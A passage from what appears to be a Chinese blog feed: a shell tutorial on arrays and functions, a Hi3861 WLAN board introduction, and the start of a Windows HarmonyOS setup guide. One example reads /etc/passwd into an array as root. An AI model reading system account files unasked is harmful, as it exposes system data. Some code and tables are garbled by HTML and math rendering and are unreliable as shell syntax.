从文件中读入定义数组</h4><ul><li>从文件中读入定义数组是使用命令的输出结果作为数组的内容。其语法格式为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array_name=($&#123;命令&#125;)</span><br><span class="line">数组名=($(`变量名`))</span><br><span class="line">或者</span><br><span class="line">array_name=(`命令`)</span><br><span class="line">数组名=(`变量值`)</span><br></pre></td></tr></table></figure><ul><li>这种方法要求一次赋多个值。</li><li>从文件中读入定义数组。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# array=(`cat /etc/passwd`)</span><br><span class="line">[root@hdp-1 shell]# echo $&#123;array[*]&#125;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><h3 id="53-shell数组的遍历及赋值"><a class="markdownIt-Anchor" href="#53-shell数组的遍历及赋值">#</a> 5.3 Shell 数组的遍历及赋值</h3><h4 id="531-常见的访问shell数组表达式"><a class="markdownIt-Anchor" href="#531-常见的访问shell数组表达式">#</a> 5.3.1 常见的访问 Shell 数组表达式</h4><ul><li>表列出了常见访问数组的表达式。</li></ul><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td !array[*]="">echo $</td><td>访问数组所有索引</td></tr><tr><td !array[@]="">echo $</td><td>访问数组所有索引</td></tr><tr><td array[*]="">echo $</td><td>访问数组所有值</td></tr><tr><td array[@]="">echo $</td><td>访问数组所有值</td></tr><tr><td id="array[@]">echo $</td><td>统计数组元素个数</td></tr><tr><td array[0]="">echo $</td><td>访问数组中的第一个元素</td></tr><tr><td array[@]:1="">echo $</td><td>从数组下标 1 开始</td></tr><tr><td array[@]:1:2="">echo $</td><td>从数组下标 1 开始，访问两个元素</td></tr><tr><td id="array[#]">echo $</td><td>第 #个元素的字符个数</td></tr><tr><td id="array">echo $</td><td>第 0 个元素的字符个数</td></tr><tr><td array[#]="">echo $</td><td>显示第 #个元素</td></tr><tr><td array="">echo $</td><td>显示第 0 个与元素</td></tr></tbody></table><h4 id="532-while循环实现shell数组的遍历"><a class="markdownIt-Anchor" href="#532-while循环实现shell数组的遍历">#</a> 5.3.2 while 循环实现 Shell 数组的遍历</h4><ul><li>以 host 文件的每一行作为数组的一个元素来赋值，并对该数组进行遍历。具体如下所示。</li><li>while 循环实现 Shell 数组的遍历。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat array_host_while.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">hosts[++i]=$line</span><br><span class="line"></span><br><span class="line">done &lt;/etc/hosts</span><br><span class="line"></span><br><span class="line">echo &quot;hosts first : $&#123;hosts[1]&#125;&quot;</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">for i in $&#123;!hosts[@]&#125;</span><br><span class="line">do</span><br><span class="line">echo &quot;$i: $&#123;hosts[i]&#125;&quot;</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>while 读入 /etc/hosts 文件的每一行并把它显示出来，hosts [++i]=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>n</mi><mi>e</mi><mtext>这个表达式完成数组的赋值操作，</mtext></mrow><annotation encoding="application/x-tex">line这个表达式完成数组的赋值操作，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">达</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">完</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">，</span></span></span></span>{!hosts [@]} 这个表达式获得数组的索引，${hosts [i]} 这个表达式完成了数组的遍历。</li><li>执行结果如下：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ./array_host_while.sh </span><br><span class="line">hosts first : 127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line"></span><br><span class="line">1: 127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">2: ::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">3: </span><br><span class="line">4: 172.18.*.* as</span><br><span class="line">5: 172.18.*.* hdp-1</span><br><span class="line">6: 172.18.*.* hdp-2</span><br><span class="line">7: 172.18.*.* hdp-3</span><br></pre></td></tr></table></figure><h4 id="533-for循环实现shell数组的遍历"><a class="markdownIt-Anchor" href="#533-for循环实现shell数组的遍历">#</a> 5.3.3 for 循环实现 Shell 数组的遍历</h4><ul><li>当一个脚本需要传入的参数较多时，可以使用 for 循环进行参数遍历。具体如下例所示。</li><li>for 循环实现 Shell 数组的遍历。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat array_host_for.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">for</span> array</span></span><br><span class="line">OLD_IFS=$IFS</span><br><span class="line">IFS=$&#x27;\n&#x27; </span><br><span class="line">for line in `cat /etc/hosts`</span><br><span class="line">do</span><br><span class="line">hosts[++j]=$line</span><br><span class="line">done</span><br><span class="line">for i in $&#123;!hosts[@]&#125;</span><br><span class="line">do</span><br><span class="line">echo &quot;$i: $&#123;hosts[i]&#125;&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><ul><li>定义一个数组 hosts 以 /etc/hosts 每一行内容作为数组的元素进行遍历。</li><li>执行结果如下：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ./array_host_for.sh </span><br><span class="line">1: 127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">2: ::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">3: </span><br><span class="line">4: 172.18.*.* as</span><br><span class="line">5: 172.18.*.* hdp-1</span><br><span class="line">6: 172.18.*.* hdp-2</span><br><span class="line">7: 172.18.*.* hdp-3</span><br></pre></td></tr></table></figure><h2 id="6-shell函数"><a class="markdownIt-Anchor" href="#6-shell函数">#</a> 6 Shell 函数</h2><h3 id="61-shell函数的概念"><a class="markdownIt-Anchor" href="#61-shell函数的概念">#</a> 6.1 Shell 函数的概念</h3><ul><li>函数是由若干条 Shell 命令组成的语句块，实现代码重用和模块化编程，它不是一个单独的进程，不能独立运行，它只是 Shell 程序的一部分。</li><li>Shell 函数和 Shell 程序比较相似，区别在于：Shell 程序在子 Shell 中运行，而 Shell 函数在当前 Shell 中运行，因此在当前 Shell 中，函数可以对 Shell 变量进行修改。</li><li>函数可以提高程序的可读性和重用性。</li></ul><h3 id="62-shell函数的语法"><a class="markdownIt-Anchor" href="#62-shell函数的语法">#</a> 6.2 Shell 函数的语法</h3><ul><li>Shell 函数的语法格式为：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">函数名()&#123;</span><br><span class="line">代码块</span><br><span class="line">&#125;</span><br><span class="line">or</span><br><span class="line">function 函数名 &#123;</span><br><span class="line">代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>关键字 function 表示定义一个函数，可以省略，其后是函数名，两个大括号之间是函数体。创建的函数可以在别的脚本中被调用。</li></ul><h3 id="63-shell函数的调用"><a class="markdownIt-Anchor" href="#63-shell函数的调用">#</a> 6.3 Shell 函数的调用</h3><h4 id="631-shell函数的传参介绍"><a class="markdownIt-Anchor" href="#631-shell函数的传参介绍">#</a> 6.3.1 Shell 函数的传参介绍</h4><ul><li>最基本的语法格式为：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名</span><br></pre></td></tr></table></figure><ul><li>带有参数的语法格式为：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名 参数1 参数2</span><br></pre></td></tr></table></figure><ul><li>Shell 的位置参数（$1、$2、…）可以作为函数的参数来使用。其中，$1 表示第一个参数，$2 表示第二个参数。</li><li>当 n≥10 时，需要使用 ${n} 来获取参数。例如，获取第十个参数不能用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mtext>，需要用</mtext></mrow><annotation encoding="application/x-tex">10，需要用</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">用</span></span></span></span> {10}。</li></ul><h3 id="64-shell函数的应用实战"><a class="markdownIt-Anchor" href="#64-shell函数的应用实战">#</a> 6.4 Shell 函数的应用实战</h3><h4 id="641-脚本中调用shell函数"><a class="markdownIt-Anchor" href="#641-脚本中调用shell函数">#</a> 6.4.1 脚本中调用 Shell 函数</h4><ul><li>函数必须在使用前需要先被定义。因此，在脚本中使用函数时，必须在脚本开始前定义函数，调用函数仅使用函数名即可</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ./function.sh </span><br><span class="line">5的阶乘是: 120</span><br><span class="line">[root@hdp-1 shell]# cat function.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">factorial()&#123;</span><br><span class="line">factorial=1</span><br><span class="line">for((i=1;i&lt;=5;i++))</span><br><span class="line">do</span><br><span class="line">factorial=$[$factorial * $i]</span><br><span class="line">done</span><br><span class="line">echo &quot;5的阶乘是: $factorial&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial</span><br></pre></td></tr></table></figure><ul><li>接下来使用带有可以传参调用的函数来写一个计算阶乘的脚本</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ./function.sh 5</span><br><span class="line">5的阶乘是: 120</span><br><span class="line">[root@hdp-1 shell]# cat function.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">factorial()&#123;</span><br><span class="line">factorial=1</span><br><span class="line">for((i=1;i&lt;=$1;i++))</span><br><span class="line">do</span><br><span class="line">factorial=$[$factorial * $i]</span><br><span class="line">done</span><br><span class="line">echo &quot;5的阶乘是: $factorial&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial $1 </span><br></pre></td></tr></table></figure><ul><li>函数的位置参数与脚本的位置参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ./position_func.sh 2 3 4</span><br><span class="line">result is : 24</span><br><span class="line">[root@hdp-1 shell]# cat position_func.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ $# -ne 3 ];then</span><br><span class="line">echo &quot;usage: `basename $0` p1 p2 p3&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">fun()&#123;</span><br><span class="line">echo &quot;$[$1*$2*$3]&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">result</span></span><br><span class="line">result=`fun $1 $2 $3`</span><br><span class="line">echo &quot;result is : $result&quot;</span><br></pre></td></tr></table></figure><h4 id="642-shell函数的返回值"><a class="markdownIt-Anchor" href="#642-shell函数的返回值">#</a> 6.4.2 Shell 函数的返回值</h4><ul><li>函数有两种返回值，分别为执行结果的返回值和退出状态码。</li><li>函数的退出状态码取决于函数中执行的最后一条命令的退出状态码。</li><li>自定义退出状态码的语法格式为：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">return 0 无错误返回</span><br><span class="line">return 1-255 有错误返回</span><br></pre></td></tr></table></figure><ul><li>退出状态码使用 return 保留字返回</li><li>return 的返回值只能是 0~255 的一个整数</li><li>执行结果的返回值不使用 return</li><li>执行结果的返回值将保存到变量 “$?” 中</li><li>函数执行结果的的返回值。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ./return.sh </span><br><span class="line">Enter a Number: 3</span><br><span class="line">fun2 return value: 0</span><br><span class="line">[root@hdp-1 shell]# cat return.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">fun2()&#123;</span><br><span class="line">read -p &quot;Enter a Number: &quot; num</span><br><span class="line">let 2*num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun2</span><br><span class="line">echo &quot;fun2 return value: $?&quot;</span><br></pre></td></tr></table></figure><h4 id="643-shell函数数组变量的传参"><a class="markdownIt-Anchor" href="#643-shell函数数组变量的传参">#</a> 6.4.3 Shell 函数数组变量的传参</h4><ul><li>向函数中传递数组</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ./array_func.sh </span><br><span class="line">120</span><br><span class="line">[root@hdp-1 shell]# cat array_func.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">num=(1 2 3 4 5)</span><br><span class="line"></span><br><span class="line">array()&#123;</span><br><span class="line">result=1</span><br><span class="line">for i in &quot;$@&quot;</span><br><span class="line">do</span><br><span class="line">result=$[$result*$i]</span><br><span class="line">done</span><br><span class="line">echo &quot;$result&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array $&#123;num[@]&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 平台 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(1)Hi3861开发板介绍</title>
      <link href="/2021/07/28/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(1)Hi3861%E5%BC%80%E5%8F%91%E6%9D%BF%E4%BB%8B%E7%BB%8D/"/>
      <url>/2021/07/28/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(1)Hi3861%E5%BC%80%E5%8F%91%E6%9D%BF%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="hi3861开发板介绍"><a class="markdownIt-Anchor" href="#hi3861开发板介绍">#</a> Hi3861 开发板介绍</h1><p>更新时间: 2021-07-21 09:12</p><h2 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h2><p>Hi3861 WLAN 模组是一片大约 2cm*5cm 大小的开发板，是一款高度集成的 2.4GHz WLAN SoC 芯片，集成 IEEE 802.11b/g/n 基带和 RF（Radio Frequency）电路。支持 HarmonyOS，并配套提供开放、易用的开发和调试运行环境。</p><p><strong>图 1</strong> Hi3861 WLAN 模组外观图</p><p><img "" class="lazyload placeholder" data-original="(1)Hi3861%E5%BC%80%E5%8F%91%E6%9D%BF%E4%BB%8B%E7%BB%8D/0000000000011111111.20210720210835.65790374497367151790022312337433505207200112592800C0CA3FF463F35CAB7D86B2DE0C2F4173E797E1B4FB16EA6096074D46DDF0FFA3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="点击放大"></p><p>另外，Hi3861 WLAN 模组还可以通过与 Hi3861 底板连接，扩充自身的外设能力，底板如下图所示。</p><p><strong>图 2</strong> Hi3861 底板外观图</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210835.93870309435698895266524018593532:50520720011259:2800:54E179425F0DF0FD559E460B8A9DCCD1D0A9B9AED898F7E84F35EBE440E393AE.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p><ul><li><p>RF 电路包括功率放大器 PA（Power Amplifier）、低噪声放大器 LNA（Low Noise Amplifier）、RF Balun、天线开关以及电源管理等模块；支持 20MHz 标准带宽和 5MHz/10MHz 窄带宽，提供最大 72.2Mbit/s 物理层速率。</p></li><li><p>Hi3861 WLAN 基带支持正交频分复用（OFDM）技术，并向下兼容直接序列扩频（DSSS）和补码键控（CCK）技术，支持 IEEE 802.11 b/g/n 协议的各种数据速率。</p></li><li><p>Hi3861 芯片集成高性能 32bit 微处理器、硬件安全引擎以及丰富的外设接口，外设接口包括 SPI（Synchronous Peripheral Interface）、UART（Universal Asynchronous Receiver &amp; Transmitter）、I2C（The Inter Integrated Circuit）、PWM（Pulse Width Modulation）、GPIO（General Purpose Input/Output）和多路 ADC（Analog to Digital Converter），同时支持高速 SDIO2.0（Secure Digital Input/Output）接口，最高时钟可达 50MHz；芯片内置 SRAM（Static Random Access Memory）和 Flash，可独立运行，并支持在 Flash 上运行程序。</p></li><li><p>Hi3861 芯片适用于智能家电等物联网智能终端领域。</p><p><strong>图 3</strong> Hi3861 功能框图</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210835.93395099655744724731010133328842:50520720011259:2800:2F9519DC070F9FEAFCFD032F27E2357DA32A9D97F894750BBF98655C47CB6446.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="点击放大"></p></li></ul><h2 id="资源和约束"><a class="markdownIt-Anchor" href="#资源和约束">#</a> 资源和约束</h2><p>Hi3861 WLAN 模组资源十分有限，整板共 2MB FLASH，352KB RAM。在编写业务代码时，需注意资源使用效率。</p><h2 id="开发板规格"><a class="markdownIt-Anchor" href="#开发板规格">#</a> 开发板规格</h2><table><thead><tr><th>规格类型</th><th>规格清单</th></tr></thead><tbody><tr><td>通用规格</td><td>1×1 2.4GHz 频段（ch1～ch14）PHY 支持 IEEE 802.11b/g/nMAC 支持 IEEE802.11 d/e/h/i/k/v/w 内置 PA 和 LNA，集成 TX/RX Switch、Balun 等支持 STA 和 AP 形态，作为 AP 时最大支持 6 个 STA 接入支持 WFA WPA/WPA2 personal、WPS2.0 支持与 BT/BLE 芯片共存的 2/3/4 线 PTA 方案电源电压输入范围：2.3V～3.6VIO 电源电压支持 1.8V 和 3.3V 支持 RF 自校准方案低功耗：Ultra Deep Sleep 模式：5μA@3.3VDTIM1：1.5mA@3.3VDTIM3：0.8mA@3.3V</td></tr><tr><td>PHY 特性</td><td>支持 IEEE802.11b/g/n 单天线所有的数据速率支持最大速率：72.2Mbps@HT20 MCS7 支持标准 20MHz 带宽和 5M/10M 窄带宽支持 STBC 支持 Short-GI</td></tr><tr><td>MAC 特性</td><td>支持 A-MPDU，A-MSDU 支持 Blk-ACK 支持 QoS，满足不同业务服务质量需求</td></tr><tr><td>CPU 子系统</td><td>高性能 32bit 微处理器，最大工作频率 160MHz 内嵌 SRAM 352KB、ROM 288KB 内嵌 2MB Flash</td></tr><tr><td>外围接口</td><td>1 个 SDIO 接口、2 个 SPI 接口、2 个 I2C 接口、3 个 UART 接口、15 个 GPIO 接口、7 路 ADC 输入、6 路 PWM、1 个 I2S 接口（注：上述接口通过复用实现）外部主晶体频率 40M 或 24M</td></tr><tr><td>其他信息</td><td>封装：QFN-32，5mm×5mm 工作温度：-40℃ ～ +85℃</td></tr></tbody></table><h2 id="harmonyos关键特性"><a class="markdownIt-Anchor" href="#harmonyos关键特性">#</a> HarmonyOS 关键特性</h2><p>HarmonyOS 基于 Hi3861 平台提供了多种开放能力，提供的关键组件如下表所示。</p><table><thead><tr><th>组件名</th><th>能力介绍</th></tr></thead><tbody><tr><td>WLAN 服务</td><td>提供 WLAN 服务能力。包括：station 和 hotspot 模式的连接、断开、状态查询等。</td></tr><tr><td>模组外设控制</td><td>提供操作外设的能力。包括：I2C、I2S、ADC、UART、SPI、SDIO、GPIO、PWM、FLASH 等。</td></tr><tr><td>分布式软总线</td><td>在 HarmonyOS 分布式网络中，提供设备被发现、数据传输的能力。</td></tr><tr><td>设备安全绑定</td><td>提供在设备互联场景中，数据在设备之间的安全流转的能力。</td></tr><tr><td>基础加解密</td><td>提供密钥管理、加解密等能力。</td></tr><tr><td>系统服务管理</td><td>系统服务管理基于面向服务的架构，提供了 HarmonyOS 统一化的系统服务开发框架。</td></tr><tr><td>启动引导</td><td>提供系统服务的启动入口标识。在系统服务管理启动时，调用 boostrap 标识的入口函数，并启动系统服务。</td></tr><tr><td>系统属性</td><td>提供获取与设置系统属性的能力。</td></tr><tr><td>基础库</td><td>提供公共基础库能力。包括：文件操作、KV 存储管理等。</td></tr><tr><td>DFX</td><td>提供 DFX 能力。包括：流水日志、时间打点等。</td></tr><tr><td>XTS</td><td>提供 HarmonyOS 生态认证测试套件的集合能力。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙设备开发(hi3861) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鸿蒙 </tag>
            
            <tag> 单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(2)Windows开发环境准备</title>
      <link href="/2021/07/28/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(2)Windows%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
      <url>/2021/07/28/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(2)Windows%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="windows开发环境准备"><a class="markdownIt-Anchor" href="#windows开发环境准备">#</a> Windows 开发环境准备</h1><p>更新时间: 2021-07-21 09:12</p><p>系统要求：Windows 10 64 位系统。</p><p>DevEco Device Tool 以插件方式提供，基于 Visual Studio Code 进行扩展，安装分为如下几步：</p><ol><li>安装 Visual Studio Code</li><li>安装 Python</li><li>安装 Node.js</li><li>安装 hpm</li><li>安装 DevEco Device Tool 插件</li></ol><h2 id="获取软件"><a class="markdownIt-Anchor" href="#获取软件">#</a> 获取软件</h2><table><thead><tr><th>工具名称</th><th>用途说明</th><th>版本要求</th><th>获取渠道</th></tr></thead><tbody><tr><td>Visual Studio Code</td><td>代码编辑工具</td><td>V1.53 及以上 64 位版本。</td><td><a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a></td></tr><tr><td>Python</td><td>编译构建工具</td><td>V3.7.4~V3.8.x 64 位版本</td><td>推荐下载：<a href="https://www.python.org/downloads/release/python-388/">https://www.python.org/downloads/release/python-388/</a></td></tr><tr><td>Node.js</td><td>提供 npm 环境</td><td>v12.0.0 及以上 64 位版本</td><td><a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></td></tr><tr><td>hpm</td><td>包管理工具</td><td>最新版</td><td>请参考<a href="https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-env-setup-win-0000001105567362#section173054793610">安装 hpm</a>。</td></tr><tr><td>DevEco Device Tool</td><td>HarmonyOS 源码的编译、烧录、调试插件工具</td><td>v2.2 Beta1</td><td><a href="https://device.harmonyos.com/cn/ide#download%E4%B8%8B%E8%BD%BD%E5%89%8D%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%E5%8D%8E%E4%B8%BA%E5%BC%80%E5%8F%91%E8%80%85%E5%B8%90%E5%8F%B7%E7%99%BB%E5%BD%95%EF%BC%8C%E5%A6%82%E6%9C%AA%E6%B3%A8%E5%86%8C%EF%BC%8C%E8%AF%B7%E5%85%88">https://device.harmonyos.com/cn/ide#download 下载前，请使用华为开发者帐号登录，如未注册，请先</a><a href="https://developer.huawei.com/consumer/cn/doc/start/registration-and-verification-0000001053628148">注册华为开发者帐号</a>。</td></tr></tbody></table><h2 id="安装visual-studio-code"><a class="markdownIt-Anchor" href="#安装visual-studio-code">#</a> 安装 Visual Studio Code</h2><p>说明</p><p>如果已安装 Visual Studio Code，打开命令行工具，输入<strong> code --version</strong> 命令，检查版本号是否为 1.53 及以上版本；可以正常返回版本号，说明环境变量设置也正确。</p><ol><li><p>双击 Visual Studio Code 软件包进行安装。安装过程中，请勾选 “添加到 PATH（重启后生效）”。</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210835.18512664503469265160641472664229:50520720011259:2800:AF78793A3F46D46F6A5BEC000068B99202B3D69C7C91898D7E88D4CE10C590D1.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="点击放大"></p></li><li><p>安装完成后，重启计算机，使 Visual Studio Code 的环境变量生效。</p></li><li><p>打开命令行工具，输入<strong> code --version</strong> 命令，可以正常显示版本号说明安装成功。</p></li></ol><h2 id="安装python"><a class="markdownIt-Anchor" href="#安装python">#</a> 安装 Python</h2><ol><li><p>双击 Python 安装包进行安装，勾选 “<strong>Add Python 3.8 to PATH</strong>”，然后点击<strong> Install Now</strong> 开始安装。</p><p><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210835.68236634967698989280426882876057:50520720011259:2800:555A136AC6427598978B4FEC4D474179D6021148162C91E295A883DC39DFE8B7.png?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p></li><li><p>等待安装完成后，点击<strong> Close</strong>。</p><p><img "" class="lazyload placeholder" 